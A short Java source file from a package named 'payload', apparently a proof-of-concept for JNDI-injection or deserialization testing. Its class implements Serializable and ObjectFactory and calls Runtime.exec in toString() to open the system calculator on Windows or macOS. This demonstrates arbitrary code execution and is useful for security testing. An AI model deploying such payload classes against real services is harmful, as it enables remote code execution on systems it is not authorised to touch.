package payload;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class OpenCalculator implements Serializable, ObjectFactory
{
    static {
        System.out.println("Calculator payload received by static");
    }

    public OpenCalculator() {
        System.out.println("Calculator payload received by constructor");
    }

    @Override public String toString() {
        openClaculator();
        return "Calculator payload";
    }

    private static void openClaculator() {
        try {
            String[] var0 = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", "calc.exe"} : new String[]{"open", "/System/Applications/Calculator.app"};
            Runtime.getRuntime().exec(var0).waitFor();
        } catch (Exception var1) {
            var1.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception
    {
        return this;
    }

    public static void main(String[] args)
    {
        new OpenCalculator();
    }
}
